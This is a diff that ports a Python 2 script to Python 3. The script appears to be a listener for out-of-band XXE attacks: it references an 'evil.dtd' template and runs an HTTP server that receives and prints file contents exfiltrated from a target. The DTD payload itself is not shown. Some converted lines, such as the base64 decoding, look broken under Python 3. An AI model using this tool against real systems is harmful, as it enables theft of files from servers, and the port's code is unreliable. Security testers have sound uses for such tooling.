@@ -1,9 +1,9 @@
 #!/usr/bin/env python
 
-from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
+from http.server import BaseHTTPRequestHandler,HTTPServer
 from hashlib import sha1
 import sys, os
-import urllib
+import urllib.request, urllib.parse, urllib.error
 
 DTD_NAME = "evil.dtd"
 DTD_TEMPLATE = """
@@ -58,13 +58,13 @@ def displayContents(contents, isBase64=False):
     global LAST_CONTENTS
     newContents = sha1(contents).hexdigest()
     if LAST_CONTENTS != newContents:
-        print "[+] Received response, displaying\n"
+        print("[+] Received response, displaying\n")
         if not isBase64:
-            print urllib.unquote(contents)
+            print((urllib.parse.unquote(contents)))
         else:
-            print urllib.unquote(contents).decode('base64')
+            print((urllib.parse.unquote(contents).decode('base64')))
         LAST_CONTENTS = newContents
-        print "------\n"
+        print("------\n")
     return
     
   
@@ -76,19 +76,19 @@ def startServer(ip, port=8000, isb64=False):
         #touches a file to let the other process know the server is running. super hacky
         with open('.server_started','w') as check:
             check.write('true')
-        print '\n[+] started server on {}:{}'.format(ip,port)
-        print '\n[+] Request away. Happy hunting.'
-        print '[+] press Ctrl-C to close\n'
+        print(('\n[+] started server on {}:{}'.format(ip,port)))
+        print('\n[+] Request away. Happy hunting.')
+        print('[+] press Ctrl-C to close\n')
         server.serve_forever()
 
     except KeyboardInterrupt:
-        print "\n...shutting down"
+        print("\n...shutting down")
         if os.path.exists('.server_started'):
             os.remove('.server_started')
         server.socket.close()
         
 def usage():
-    print "Usage: {} <ip> <port>".format(sys.argv[0])
+    print(("Usage: {} <ip> <port>".format(sys.argv[0])))
 
         
     
